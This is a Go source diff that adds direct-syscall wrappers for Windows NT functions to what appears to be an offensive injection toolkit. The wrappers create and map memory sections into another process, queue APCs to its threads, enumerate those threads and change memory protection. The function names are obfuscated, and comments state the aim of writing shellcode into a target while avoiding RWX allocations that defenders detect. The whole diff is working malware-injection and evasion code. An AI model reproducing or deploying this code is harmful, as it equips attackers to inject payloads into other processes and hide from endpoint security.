@@ -15,6 +15,12 @@ import (
 
 const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1
 
+const (
+	sectionAllAccess uintptr = 0xF001F    // SECTION_ALL_ACCESS
+	secCommit        uintptr = 0x8000000  // SEC_COMMIT
+	viewUnmap        uintptr = 2          // SECTION_INHERIT: ViewUnmap
+)
+
 var (
 	hgNtProtectOnce sync.Once
 	hgNtProtectProc *HGProc
@@ -33,6 +39,21 @@ var (
 
 	hgNtCreateThreadOnce sync.Once
 	hgNtCreateThreadProc *HGProc
+
+	hgNtCreateSectionOnce sync.Once
+	hgNtCreateSectionProc *HGProc
+
+	hgNtMapViewOnce sync.Once
+	hgNtMapViewProc *HGProc
+
+	hgNtUnmapViewOnce sync.Once
+	hgNtUnmapViewProc *HGProc
+
+	hgNtQueueApcOnce sync.Once
+	hgNtQueueApcProc *HGProc
+
+	hgNtGetNextThreadOnce sync.Once
+	hgNtGetNextThreadProc *HGProc
 )
 
 func getNtProtectProc() *HGProc {
@@ -75,6 +96,41 @@ func getNtCreateThreadProc() *HGProc {
 		hgNtCreateThreadProc = NewHGProc("NtCreateThreadEx")
 	})
 	return hgNtCreateThreadProc
+}
+
+func getNtCreateSectionProc() *HGProc {
+	hgNtCreateSectionOnce.Do(func() {
+		hgNtCreateSectionProc = NewHGProc(sNtCreateSection())
+	})
+	return hgNtCreateSectionProc
+}
+
+func getNtMapViewProc() *HGProc {
+	hgNtMapViewOnce.Do(func() {
+		hgNtMapViewProc = NewHGProc(sNtMapViewOfSection())
+	})
+	return hgNtMapViewProc
+}
+
+func getNtUnmapViewProc() *HGProc {
+	hgNtUnmapViewOnce.Do(func() {
+		hgNtUnmapViewProc = NewHGProc(sNtUnmapViewOfSection())
+	})
+	return hgNtUnmapViewProc
+}
+
+func getNtQueueApcProc() *HGProc {
+	hgNtQueueApcOnce.Do(func() {
+		hgNtQueueApcProc = NewHGProc(sNtQueueApcThread())
+	})
+	return hgNtQueueApcProc
+}
+
+func getNtGetNextThreadProc() *HGProc {
+	hgNtGetNextThreadOnce.Do(func() {
+		hgNtGetNextThreadProc = NewHGProc(sNtGetNextThread())
+	})
+	return hgNtGetNextThreadProc
 }
 
 // NtAllocateVirtualMemory allocates virtual memory in a process without going
@@ -169,6 +225,111 @@ func NtWriteRemote(processHandle uintptr, dst uintptr, src []byte) bool {
 		uintptr(unsafe.Pointer(&written)),
 	)
 	return r == 0
+}
+
+// NtProtectRemote changes memory protection in an arbitrary process via a
+// direct NtProtectVirtualMemory syscall. Used to flip RW→RX in a target after
+// writing shellcode, so the target never has an RWX allocation at rest.
+func NtProtectRemote(processHandle uintptr, addr uintptr, size uintptr, newProtect uint32) bool {
+	p := getNtProtectProc()
+	if p == nil {
+		return false
+	}
+	var old uint32
+	r, _, _ := p.Call(
+		processHandle,
+		uintptr(unsafe.Pointer(&addr)),
+		uintptr(unsafe.Pointer(&size)),
+		uintptr(newProtect),
+		uintptr(unsafe.Pointer(&old)),
+	)
+	return r == 0
+}
+
+// NtCreateSection creates a pagefile-backed memory section with the given
+// maximum size and page protection.  Returns the section handle or 0 on error.
+func NtCreateSection(maxSize uint64, protect uint32) uintptr {
+	p := getNtCreateSectionProc()
+	if p == nil {
+		return 0
+	}
+	var hSection uintptr
+	sizeVal := maxSize
+	r, _, _ := p.Call(
+		uintptr(unsafe.Pointer(&hSection)),
+		sectionAllAccess,
+		0,
+		uintptr(unsafe.Pointer(&sizeVal)),
+		uintptr(protect),
+		secCommit,
+		0,
+	)
+	if r != 0 {
+		return 0
+	}
+	return hSection
+}
+
+// NtMapViewOfSection maps a view of sectionHandle into processHandle.
+// baseAddr and viewSize are in/out: on success baseAddr receives the mapped
+// address and viewSize receives the actual mapped size.
+func NtMapViewOfSection(sectionHandle uintptr, processHandle uintptr, baseAddr *uintptr, viewSize *uintptr, protect uint32) bool {
+	p := getNtMapViewProc()
+	if p == nil {
+		return false
+	}
+	r, _, _ := p.Call(
+		sectionHandle,
+		processHandle,
+		uintptr(unsafe.Pointer(baseAddr)),
+		0, 0, 0,
+		uintptr(unsafe.Pointer(viewSize)),
+		viewUnmap,
+		0,
+		uintptr(protect),
+	)
+	return r == 0
+}
+
+// NtUnmapViewOfSection unmaps a mapped view from processHandle.
+func NtUnmapViewOfSection(processHandle uintptr, baseAddr uintptr) {
+	p := getNtUnmapViewProc()
+	if p != nil {
+		p.Call(processHandle, baseAddr)
+	}
+}
+
+// NtQueueApcThread queues a user-mode APC to threadHandle pointing at
+// apcRoutine with apcArg as the first argument.
+func NtQueueApcThread(threadHandle uintptr, apcRoutine uintptr, apcArg uintptr) bool {
+	p := getNtQueueApcProc()
+	if p == nil {
+		return false
+	}
+	r, _, _ := p.Call(threadHandle, apcRoutine, apcArg, 0, 0)
+	return r == 0
+}
+
+// NtGetNextThread enumerates threads in processHandle.  Pass 0 as prevThread
+// to get the first thread; pass the previous result to advance.  The caller is
+// responsible for closing the returned handle.  Returns 0 when no more threads.
+func NtGetNextThread(processHandle uintptr, prevThread uintptr, accessMask uint32) uintptr {
+	p := getNtGetNextThreadProc()
+	if p == nil {
+		return 0
+	}
+	var newThread uintptr
+	r, _, _ := p.Call(
+		processHandle,
+		prevThread,
+		uintptr(accessMask),
+		0, 0,
+		uintptr(unsafe.Pointer(&newThread)),
+	)
+	if r != 0 {
+		return 0
+	}
+	return newThread
 }
 
 // ntFlush flushes the CPU instruction cache after patching executable memory.
